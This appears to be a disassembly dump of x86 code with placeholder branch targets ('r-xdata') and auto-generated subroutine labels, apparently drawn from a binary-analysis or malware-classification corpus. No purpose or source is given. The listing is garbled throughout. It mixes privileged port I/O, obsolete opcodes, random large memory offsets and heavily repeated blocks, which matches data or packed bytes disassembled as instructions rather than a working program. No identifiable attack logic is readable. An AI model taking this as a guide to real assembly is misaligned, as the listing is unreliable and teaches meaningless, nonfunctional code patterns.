xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a0de
sti
sub esi eax
jmp r-xdata
and eax 0xeb84848f
jmp r-xdata
movsb [ edi ] [ esi ]
test [ esi + esi * 8 - 0x266d7cc2 ] al
lodsd [ esi ]
test [ ebx + ebp * 8 - 0x7c6dd415 ] al
pop esp
jpo r-xdata
jmp r-xdata
pushfd
test [ eax + ecx * 2 + 0x7e0392bb ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebp 0x848dac93
test [ edx - 0x7b7b5ccd ] dl
jmp r-xdata
sub_47a0f8
mov ebx 0x923aff74
test [ eax + ecx * 2 + 0x40923bbb ] al
xchg edx eax
test [ esi + esi * 8 + 0x112b833e ] al
xchg edx eax
dec edi
arpl [ ebx + 0x7b ] di
jmp r-xdata
test bl ch
jmp r-xdata
cmpsd [ esi ] [ edi ]
xchg ebx eax
adc [ ecx - 0x1097b7c ] al
mov bl 0x86
test [ ebx + ebp - 0x7b79b56e ] al
sub_47a114
push es
mov edi 0xeb922d11
cmpsd [ esi ] [ edi ]
test [ esi + esi * 8 + 0x1093a736 ] al
add [ esp + eax * 4 - 0x794c010a ] 0x922b8484
dec edx
xchg [ esp + eax * 4 - 0x14141415 ] al
adc [ edi ] ebx
sbb eax 0x239d3ef2
xchg edx eax
leave
cwde
test [ eax + esi * 8 + 0x6c199297 ] al
mov [ esp + eax * 4 + 0x48ebebeb ] al
test eax 0x7b62ef92
jpo r-xdata
clc
xchg ebx eax
jmp r-xdata
call [ eax ]
jle r-xdata
jns r-xdata
mov ebx 0x91c0ff74
test [ edx + edx * 4 - 0x7b7b51d2 ] al
jmp r-xdata
arpl si si
mov ebp [ ebx ]
idiv [ esi ]
shr [ ebx ] cl
jmp r-xdata
jpo r-xdata
jpo r-xdata
insb
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
adc [ ebx - 0x6e ] ebx
jns r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ esi + 0x7b ] bh
sub [ eax ] ch
sub esi esi
shr [ ebx ] cl
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a161
xor esi 0x36
fwait
xchg edx eax
jmp r-xdata
pushfd
test [ eax + ecx * 2 + 0x7e0392bb ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebp 0x848dac93
test [ edx - 0x7b7b5ccd ] dl
jmp r-xdata
and eax 0xeb84848f
jmp r-xdata
sub_47a181
add [ esp + esi * 2 - 0x7b63c802 ] 0x84
dec eax
mov ebx 0x7b7e0392
jpo r-xdata
jmp r-xdata
jmp sub_47a17e
test [ ebx + ebp * 8 - 0x420fd415 ] al
xchg ebx eax
lodsb [ esi ]
lea eax [ esp + eax * 4 - 0x7b5ccc6e ]
test bl ch
jmp r-xdata
pop [ esp + eax * 4 - 0xfd41415 ]
and eax 0xeb84848f
jmp r-xdata
jmp r-xdata
pushfd
test [ eax + ecx * 2 + 0x7e0392bb ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebp 0x848dac93
test [ edx - 0x7b7b5ccd ] dl
jmp r-xdata
sub_47a1b7
jmp r-xdata
test al dh
xor [ es : esp + ecx * 8 + 0x3e ] 0x6b
clc
jne r-xdata
pop esp
jpo r-xdata
jpo r-xdata
sbb eax 0xf08b06f2
clc
mov edi 0x8b3ef663
div [ ebx ]
jns r-xdata
xchg edx eax
or [ ebp + 0x26f08484 ] eax
xor [ esp + ecx * 8 + 0x3e ] 0x6b
jmp r-xdata
jpo r-xdata
int1
ja r-xdata
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ esp + eax * 4 + 0x748326f0 ] eax
int3
test bl ch
test [ 0xffffffff928906f2 ] ebx
inc ebp
push 0x7b
jpo r-xdata
adc [ 0x6f21d24 ] ebx
jmp r-xdata
and [ ebx + 0x7b ] ebp
call [ eax ]
jle r-xdata
adc [ esi + 0x7b ] bh
sub esi esi
shr [ ebx ] cl
sub [ eax ] ch
xchg ebx eax
jpo r-xdata
jns r-xdata
pop ebx
xchg edx eax
jpo r-xdata
mov al [ 0xffffffff8ca7ff74 ]
test [ esp + eax * 4 - 0x7bd378f2 ] al
in eax dx
jpo r-xdata
jmp r-xdata
jpo r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
0xffffffff92cc284c
stc
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
test al 0x84
test bl ch
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] ebx
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
test bl ch
jmp r-xdata
mov [ esp + eax * 4 + 0x7b137f11 ] es
dec ebx
loop r-xdata
in al dx
jmp [ edi - 0x7b7b7b74 ]
cmp esi 0xffffff84
jmp r-xdata
jmp r-xdata
xchg edx eax
and ah [ ebx + 0x7b ]
jpo r-xdata
inc [ esp + esi * 2 - 0x7b734c01 ]
test [ ecx ] dl
test [ edx + edx * 4 - 0x7b7b57c7 ] al
jmp r-xdata
jg r-xdata
push [ ebx + 0x1184848c ]
jpo r-xdata
mov bl 0x8c
test [ ecx + edx + 0x4b7b137f ] al
cmp [ eax - 0x14147b7c ] ebp
jmp r-xdata
jmp r-xdata
outsb
jpo r-xdata
jpo r-xdata
sub dl dh
std
adc esp ebp
je r-xdata
jmp r-xdata
cmp dl [ edx - 0x7b7b73b9 ]
sbb eax 0x23933ef2
jmp r-xdata
jmp r-xdata
adc [ ebx + 0x1d ] ebx
xchg ecx eax
and edx [ ecx ]
pop esi
xchg edx eax
test [ 0x23933ef2 ] bl
jmp r-xdata
jae r-xdata
shr [ edi + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
and edx [ ecx ]
pop ebx
sbb eax 0x23913ef2
adc [ esi - 0x6e ] ebx
jpo r-xdata
push es
mov [ edx + 0x7b7b6a45 ] edx
jmp r-xdata
jmp r-xdata
or eax 0xeb848485
mov esi eax
push es
sub_47a1eb
sub ecx [ eax - 0x60 ]
xchg edx eax
push edi
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ esi + esi * 8 + 0x79e35fff ] al
jpo r-xdata
jmp r-xdata
test [ ecx ] dl
sub edx [ edx + 0x7b7b502a ]
jmp r-xdata
test [ edx - 0x7b7b5ccd ] dl
jmp r-xdata
outsb
jpo r-xdata
jpo r-xdata
je r-xdata
and eax 0xeb84848f
jmp r-xdata
jmp r-xdata
cmp dl [ edx - 0x7b7b73b9 ]
sbb eax 0x23933ef2
jmp r-xdata
jpo r-xdata
dec ebp
scasb [ edi ]
int 0xae
jmp r-xdata
jmp r-xdata
adc [ ebx + 0x1d ] ebx
xchg ecx eax
and edx [ ecx ]
pop esi
xchg edx eax
test [ 0x23933ef2 ] bl
jmp r-xdata
jae r-xdata
jmp r-xdata
xchg edx eax
and ah [ ebx + 0x7b ]
jpo r-xdata
pushfd
test [ eax + ecx * 2 + 0x7e0392bb ] al
jpo r-xdata
shr [ edi + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
and edx [ ecx ]
pop ebx
sbb eax 0x23913ef2
adc [ esi - 0x6e ] ebx
jpo r-xdata
cmp [ eax - 0x14147b7c ] ebp
jmp r-xdata
inc [ esp + esi * 2 - 0x7b734c01 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
push es
mov [ edx + 0x7b7b6a45 ] edx
jmp r-xdata
or eax 0xeb848485
sub dl dh
std
je r-xdata
jmp r-xdata
push es
xchg ebx eax
jpo r-xdata
0xffffffff92cc284c
stc
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
jg r-xdata
push [ ebx + 0x1184848c ]
mov bl 0x8c
test [ ecx + edx + 0x4b7b137f ] al
mov ebp 0x848dac93
jpo r-xdata
int1
ja r-xdata
test bl ch
jmp r-xdata
mov [ esp + eax * 4 + 0x7b137f11 ] es
dec ebx
loop r-xdata
jmp r-xdata
test bl ch
mov esi eax
test [ 0xffffffff928906f2 ] ebx
inc ebp
push 0x7b
jpo r-xdata
adc [ 0x6f21d24 ] ebx
jmp r-xdata
and [ ebx + 0x7b ] ebp
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b57c7 ] al
jmp r-xdata
pop ebx
xchg edx eax
jpo r-xdata
mov al [ 0xffffffff8ca7ff74 ]
test [ esp + eax * 4 - 0x7bd378f2 ] al
in eax dx
jpo r-xdata
adc esp ebp
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test al 0x84
test bl ch
jmp r-xdata
jpo r-xdata
call [ eax ]
jle r-xdata
adc [ esi + 0x7b ] bh
jns r-xdata
sub esi esi
shr [ ebx ] cl
sub [ eax ] ch
in al dx
jmp [ edi - 0x7b7b7b74 ]
cmp esi 0xffffff84
jmp r-xdata
jpo r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ ebx - 0x6e ] ebx
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a20f
and dh al
mov ebp 0x8483e892
outsd
jpo r-xdata
test [ edi + edi * 8 - 0x3c ] dh
jae r-xdata
adc [ eax - 0x6e ] 0x7b7b73ca
adc [ ebx - 0xa ] ebp
mov ebp [ eax ]
sub edx [ ebx + 0x7b7b5c94 ]
clc
mov edi 0x8b3ef663
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call [ eax ]
jle r-xdata
adc [ esi + 0x7b ] bh
sub esi esi
shr [ ebx ] cl
sub [ eax ] ch
jmp r-xdata
jpo r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ ebx - 0x6e ] ebx
jns r-xdata
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a213
call 0x74cc269b
inc esp
outsd
jpo r-xdata
jae r-xdata
test [ edi + edi * 8 - 0x3c ] dh
adc [ eax - 0x6e ] 0x7b7b73ca
adc [ ebx - 0xa ] ebp
mov ebp [ eax ]
sub edx [ ebx + 0x7b7b5c94 ]
clc
mov edi 0x8b3ef663
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call [ eax ]
jle r-xdata
adc [ esi + 0x7b ] bh
sub esi esi
shr [ ebx ] cl
sub [ eax ] ch
jmp r-xdata
jpo r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ ebx - 0x6e ] ebx
jns r-xdata
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a278
test bl ch
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ edi + edi * 8 - 0x4d ] dh
inc edi
mov [ esp + eax * 4 - 0x6cc10de3 ] es
adc edx [ edx - 0x62 ]
in eax 0x28
xchg edx eax
test [ edi - 0x14147b7c ] dl
jmp r-xdata
jmp r-xdata
xchg edx eax
and ah [ ebx + 0x7b ]
jpo r-xdata
shr [ edi + 0x7b ] 0x1
jpo r-xdata
test [ 0x23933ef2 ] bl
jmp r-xdata
je r-xdata
cmp [ eax - 0x14147b7c ] ebp
jmp r-xdata
inc [ esp + esi * 2 - 0x7b734c01 ]
test [ ecx ] dl
jmp r-xdata
and edx [ ecx ]
pop ebx
sbb eax 0x23913ef2
adc [ esi - 0x6e ] ebx
xchg ebx eax
sub dl dh
std
outsb
jpo r-xdata
jpo r-xdata
je r-xdata
0xffffffff92cc284c
stc
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc [ ebx + 0x1d ] ebx
xchg ecx eax
and edx [ ecx ]
pop esi
xchg edx eax
cmp dl [ edx - 0x7b7b73b9 ]
sbb eax 0x23933ef2
jmp r-xdata
jpo r-xdata
jg r-xdata
push [ ebx + 0x1184848c ]
mov bl 0x8c
test [ ecx + edx + 0x4b7b137f ] al
test bl ch
jmp r-xdata
mov [ esp + eax * 4 + 0x7b137f11 ] es
dec ebx
loop r-xdata
jmp r-xdata
jae r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b57c7 ] al
jmp r-xdata
jpo r-xdata
adc esp ebp
push es
mov [ edx + 0x7b7b6a45 ] edx
jmp r-xdata
or eax 0xeb848485
push es
xchg ebx eax
jpo r-xdata
jpo r-xdata
int1
ja r-xdata
jmp r-xdata
test bl ch
mov esi eax
test [ 0xffffffff928906f2 ] ebx
inc ebp
push 0x7b
jpo r-xdata
adc [ 0x6f21d24 ] ebx
jmp r-xdata
and [ ebx + 0x7b ] ebp
pop ebx
xchg edx eax
jpo r-xdata
mov al [ 0xffffffff8ca7ff74 ]
test [ esp + eax * 4 - 0x7bd378f2 ] al
in eax dx
jpo r-xdata
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test al 0x84
test bl ch
jmp r-xdata
jpo r-xdata
call [ eax ]
jle r-xdata
adc [ esi + 0x7b ] bh
jns r-xdata
sub esi esi
shr [ ebx ] cl
sub [ eax ] ch
in al dx
jmp [ edi - 0x7b7b7b74 ]
cmp esi 0xffffff84
jmp r-xdata
jpo r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ ebx - 0x6e ] ebx
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a328
push es
in eax dx
xchg edx eax
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x68020d15 ] al
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
mov edi 0x309f3ebc
test [ esi ] cl
xchg [ esp + eax * 4 ] ebp
ror [ esp + eax * 4 + 0x185d1384 ] 0x1
sub eax 0x8b923036
mov [ esp + eax * 4 - 0x14141415 ] es
jmp r-xdata
idiv [ esi ]
mov edi 0x309f3ebc
test al 0x84
test bl ch
jmp r-xdata
jpo r-xdata
0xffffffff92cc284c
stc
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
sub dl dh
std
in al dx
jmp [ edi - 0x7b7b7b74 ]
cmp esi 0xffffff84
test bl ch
jmp r-xdata
mov [ esp + eax * 4 + 0x7b137f11 ] es
dec ebx
loop r-xdata
push [ ebx + 0x1184848c ]
jpo r-xdata
mov bl 0x8c
test [ ecx + edx + 0x4b7b137f ] al
jmp r-xdata
jmp r-xdata
xchg edx eax
and ah [ ebx + 0x7b ]
jpo r-xdata
jg r-xdata
inc [ esp + esi * 2 - 0x7b734c01 ]
test [ ecx ] dl
test [ edx + edx * 4 - 0x7b7b57c7 ] al
jmp r-xdata
outsb
jpo r-xdata
jpo r-xdata
cmp [ eax - 0x14147b7c ] ebp
jmp r-xdata
jmp r-xdata
adc esp ebp
jmp r-xdata
cmp dl [ edx - 0x7b7b73b9 ]
sbb eax 0x23933ef2
jmp r-xdata
je r-xdata
jmp r-xdata
adc [ ebx + 0x1d ] ebx
xchg ecx eax
and edx [ ecx ]
pop esi
xchg edx eax
test [ 0x23933ef2 ] bl
jmp r-xdata
jae r-xdata
shr [ edi + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
and edx [ ecx ]
pop ebx
sbb eax 0x23913ef2
adc [ esi - 0x6e ] ebx
jpo r-xdata
push es
mov [ edx + 0x7b7b6a45 ] edx
jmp r-xdata
or eax 0xeb848485
push es
xchg ebx eax
jpo r-xdata
jpo r-xdata
int1
ja r-xdata
jmp r-xdata
test bl ch
mov esi eax
test [ 0xffffffff928906f2 ] ebx
inc ebp
push 0x7b
jpo r-xdata
adc [ 0x6f21d24 ] ebx
jmp r-xdata
and [ ebx + 0x7b ] ebp
pop ebx
xchg edx eax
jpo r-xdata
in eax dx
jpo r-xdata
mov al [ 0xffffffff8ca7ff74 ]
test [ esp + eax * 4 - 0x7bd378f2 ] al
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
call [ eax ]
jle r-xdata
adc [ esi + 0x7b ] bh
jns r-xdata
sub esi esi
shr [ ebx ] cl
sub [ eax ] ch
jmp r-xdata
jpo r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ ebx - 0x6e ] ebx
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a512
test ch ch
add ebx [ 0x21b92ef2 ]
xchg edx eax
mov ebx 0x9284849e
inc ecx
xchg edx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
mov ecx 0x9ebb9221
test [ edx + edx * 4 - 0x7b7b6dbf ] al
jmp r-xdata
jmp r-xdata
mov esp 0xf8202524
mov esi 0xebb8b20f
jmp r-xdata
mov ebx 0x1d031121
movsb [ edi ] [ esi ]
sbb eax 0x928d26f2
ja r-xdata
jmp r-xdata
outsd
jpo r-xdata
jbe r-xdata
dec eax
mov al [ 0x28f33ef6 ]
inc [ 0xfffffffff87b7b7c ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xlat
jpo r-xdata
in eax dx
adc al 0x7c
jpo r-xdata
jpe r-xdata
add al 0x5b
jpe r-xdata
mov [ ecx ] edx
jmp r-xdata
clc
adc ah [ eax ]
sbb eax 0xf08f26f2
mov [ es : ecx ] edx
jmp r-xdata
jbe r-xdata
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
jmp r-xdata
jns r-xdata
adc [ edx ] edx
and [ 0xfffffffff08f26f2 ] bl
jmp r-xdata
jpo r-xdata
sti
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
pop es
pop edi
add esi [ esi + 0x7b ]
jpo r-xdata
adc [ ebx + 0x42 ] 0x3e
jmp r-xdata
int 0x58
jpo r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
sub eax 0xa0483f11
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
dec ebx
jmp r-xdata
jmp r-xdata
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
je r-xdata
jmp r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
je r-xdata
mov esp 0x9384849e
or al 0xa2
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jmp r-xdata
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
sub_47a558
jmp r-xdata
jpo sub_47a5c2
and bh dh
mov ebx 0x76d1fe74
jpo r-xdata
hlt
xchg edx eax
cmp [ ecx + 0x7b ] ch
jpo r-xdata
sub eax 0x7b74e293
jpo r-xdata
jmp r-xdata
jmp r-xdata
loop r-xdata
jmp r-xdata
xchg edx eax
je r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov al [ 0xffffffff84acf492 ]
test [ ebx + 0x7b7b6253 ] dl
test [ edi ] cl
pop edi
pop edi
je r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
mov esp 0x9384849e
or al 0xa2
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
jpo r-xdata
test ch ch
jmp r-xdata
jmp r-xdata
r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
xchg edx eax
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
jmp r-xdata
int 0x58
jpo r-xdata
xlat
adc [ ebx - 0x7c ] edi
in eax dx
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jpo r-xdata
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
sti
jns r-xdata
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
jmp r-xdata
sub eax 0xa0483f11
jmp r-xdata
jmp r-xdata
jmp r-xdata
add esi [ esi + 0x7b ]
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
dec ebx
jmp r-xdata
jmp r-xdata
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
jpo r-xdata
jbe r-xdata
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x42 ] 0x3e
sub_47a56c
push edx
jl r-xdata
dec eax
mov al [ 0x28f33ef6 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop es
pop edi
jbe r-xdata
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
inc [ 0xfffffffff87b7b7c ]
jmp r-xdata
jpo r-xdata
sti
jmp r-xdata
in eax dx
xlat
jpo r-xdata
adc al 0x7c
jpo r-xdata
adc [ ebx + 0x42 ] 0x3e
jmp r-xdata
int 0x58
jpo r-xdata
add esi [ esi + 0x7b ]
jpo r-xdata
mov al [ 0xffffffff84acf492 ]
test [ ebx + 0x7b7b6253 ] dl
add ebx [ 0x21b92ef2 ]
xchg edx eax
mov ebx 0x9284849e
inc ecx
xchg edx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub eax 0xa0483f11
mov ecx 0x9ebb9221
test [ edx + edx * 4 - 0x7b7b6dbf ] al
jmp r-xdata
jmp r-xdata
mov esp 0xf8202524
mov esi 0xebb8b20f
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
mov ebx 0x1d031121
movsb [ edi ] [ esi ]
sbb eax 0x928d26f2
ja r-xdata
jmp r-xdata
dec ebx
jmp r-xdata
jmp r-xdata
r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
outsd
jpo r-xdata
jbe r-xdata
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
je r-xdata
jmp r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
je r-xdata
mov esp 0x9384849e
or al 0xa2
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jpe r-xdata
add al 0x5b
jpe r-xdata
mov [ ecx ] edx
jmp r-xdata
clc
adc ah [ eax ]
sbb eax 0xf08f26f2
mov [ es : ecx ] edx
jmp r-xdata
jmp r-xdata
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jns r-xdata
adc [ edx ] edx
and [ 0xfffffffff08f26f2 ] bl
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
sub_47a5aa
mov eax 0xf81deb
cmp eax 0xa14b927b
test [ edx + 0x7492bbfe ] al
pushad
jpo r-xdata
jmp r-xdata
jmp r-xdata
test ch ch
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
xchg edx eax
hlt
jmp r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
mov esp 0x9384849e
or al 0xa2
jmp r-xdata
int 0x58
jpo r-xdata
xlat
adc [ ebx - 0x7c ] edi
in eax dx
jpo r-xdata
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
sub eax 0xa0483f11
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jne r-xdata
jpo r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
sti
jns r-xdata
dec ebx
jmp r-xdata
jmp r-xdata
r-xdata
jpo r-xdata
add esi [ esi + 0x7b ]
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
je r-xdata
jpo r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
je r-xdata
jbe r-xdata
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
adc [ ebx + 0x42 ] 0x3e
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
sub_47a5e2
xchg edi eax
add esi [ esi + 0x7b ]
jpo r-xdata
jmp r-xdata
int 0x58
jpo r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
sub eax 0xa0483f11
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
sti
jns r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
dec ebx
jmp r-xdata
jmp r-xdata
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
je r-xdata
jmp r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
je r-xdata
mov esp 0x9384849e
or al 0xa2
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jpo r-xdata
jmp r-xdata
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jbe r-xdata
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
xchg ebp eax
